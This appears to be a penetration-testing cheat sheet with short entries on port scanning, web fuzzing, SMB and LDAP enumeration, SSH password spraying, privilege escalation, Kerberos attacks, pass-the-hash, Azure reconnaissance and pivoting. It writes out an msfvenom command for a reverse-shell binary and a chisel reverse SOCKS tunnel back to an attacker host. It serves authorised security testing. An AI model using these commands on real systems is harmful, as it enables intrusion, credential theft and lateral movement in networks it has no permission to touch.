title: Fast top-1000 TCP scan
description: Service/version detection plus default scripts. -oA saves grepable, normal and XML output at once.
output: Open ports with service, version and any script hits (e.g. 22/tcp open ssh OpenSSH 8.9).

title: Full TCP port sweep
description: All 65535 ports quickly, then re-scan the open ones with -sV -sC for detail.
output: Complete list of open TCP ports. Feed these into a targeted second scan.

title: UDP top ports
description: UDP is slow; scan only common ports. Watch for SNMP (161), DNS (53), IKE (500).
output: open|filtered results. Confirm interesting ones with a service-specific tool.

title: Rapid port discovery into nmap
description: Very fast port discovery, then pipes into nmap for detail. Good when nmap -p- feels slow.
output: Same nmap detail output, reached far faster on responsive hosts.

title: Directory brute force
description: Discover hidden paths. Add -x php,txt,html to probe extensions.
output: Paths with status codes (200, 301, 403). 403 often means it exists but is protected.

title: Virtual host / subdomain discovery
description: Finds virtual hosts served from the same IP. Set the domain in /etc/hosts first.
output: Discovered vhosts that return a different response size than the baseline.

title: Parameter fuzzing
description: Discover hidden GET parameters. -fs filters by response size to cut noise.
output: Parameter names that change the response, worth testing for injection.

title: Recursive content discovery
description: Recursive by default, so it walks into directories it finds. Fast and thorough.
output: Tree of discovered paths with status and size, recursing automatically.

title: SMB / Samba enumeration
description: All-in-one SMB enum: shares, users, groups, password policy, OS info.
output: Domain info, share list, user accounts and the password policy if readable.

title: SMB share and access check
description: Null-session share listing. Swap in creds to see what an account can reach.
output: Shares with READ/WRITE flags per share for the supplied credentials.

title: Anonymous LDAP dump
description: Anonymous bind against a domain controller. Often leaks users and descriptions.
output: Directory objects. Check description fields for passwords left by admins.

title: Find a local exploit
description: Search the offline Exploit-DB mirror. Use -m <id> to copy an exploit locally.
output: Matching exploit titles with their EDB-ID and file path.

title: SSH password spray
description: Online brute force. Keep -t low on SSH to avoid lockouts and dropped connections.
output: Any valid user:password pairs found. Stop after the first if you only need one.

title: Linux reverse shell payload
command: msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ip> LPORT=4444 -f elf -o shell.elf
description: Generate a standalone reverse shell binary. Change -p and -f for other targets.
output: An ELF that connects back to your listener when executed on the target.

title: Automated Linux enumeration
description: Colour-coded local privesc checks. Red/yellow highlights are the highest-value findings.
output: Sections for SUID, cron, capabilities, creds. Focus on the 95%-probability hits.

title: Hunt SUID binaries
description: Lists setuid binaries. Cross-reference anything unusual against GTFOBins.
output: Full paths of SUID files. A non-standard one is often the escalation path.

title: Check sudo rights
description: Shows what the current user may run as another user. Match entries to GTFOBins.
output: Allowed commands. NOPASSWD entries and editors/interpreters are prime targets.

title: Find file capabilities
description: Capabilities can grant privilege without SUID. cap_setuid on an interpreter is a win.
output: Files with capabilities set. cap_setuid+ep is the one to look for.

title: Automated Windows enumeration
description: Windows counterpart to linpeas. Flags misconfigs, stored creds and weak services.
output: Highlighted findings across services, registry, creds and token privileges.

title: List token privileges
description: Shows privileges on the current token. SeImpersonate opens the Potato attack family.
output: Privilege list with state. Enabled SeImpersonate/SeAssignPrimaryToken are gold.

title: Collect AD graph data
description: Gathers AD relationships for BloodHound. Import the JSON to map attack paths.
output: JSON files to drag into the BloodHound GUI to find paths to Domain Admin.

title: Kerberoast service accounts
description: Requests TGS tickets for SPN accounts. Crack the hashes offline for service creds.
output: TGS hashes ($krb5tgs$) ready for hashcat mode 13100.

title: AS-REP roast
description: Targets accounts without Kerberos pre-auth. No password needed to request the hash.
output: $krb5asrep$ hashes for crackable accounts (hashcat mode 18200).

title: Pass-the-hash shell
description: Authenticate with an NT hash instead of a password. SYSTEM shell via SMB.
output: An interactive SYSTEM shell on the target when the hash is valid.

title: Enumerate current context
command: az account show && az ad signed-in-user show
description: Confirms which subscription and identity your token maps to before you touch anything.
output: Subscription, tenant and the signed-in user object — your starting blast radius.

title: List readable resources
description: Everything your identity can see in the subscription. Roles decide what appears.
output: Resource names, groups and types you have at least Reader on.

title: Dump role assignments
description: Maps who has what across the subscription. Look for Owner/Contributor to abuse.
output: Principal, role and scope rows — the RBAC map for privilege-escalation paths.

title: Entra ID (Azure AD) recon
description: Pulls the full Entra ID directory into a local DB for offline analysis.
output: A local database of users, groups, apps and roles to explore with roadrecon gui.

title: Collect Azure attack paths
description: BloodHound collector for Azure. Reveals paths across identities and resources.
output: JSON for BloodHound to graph escalation paths through Azure RBAC and Entra roles.

title: Reverse SOCKS proxy
command:
# attacker
chisel server -p 8000 --reverse
# victim
chisel client <attacker-ip>:8000 R:socks
description: Tunnel into internal networks over a SOCKS proxy. Point proxychains at port 1080.
output: A SOCKS5 proxy on the attacker at :1080 reaching the victim's internal network.

title: Interface-based pivot
description: Modern pivoting with a virtual interface — no proxychains, routes feel native.
output: A tun interface you route internal subnets through and reach directly.

title: Structure a finding
command: Title | Severity (CVSS) | Affected asset | Steps to reproduce | Impact | Remediation | Evidence
description: A repeatable skeleton for every finding so reports stay consistent and reviewable.
output: A finding a client can act on without a follow-up call for clarification.
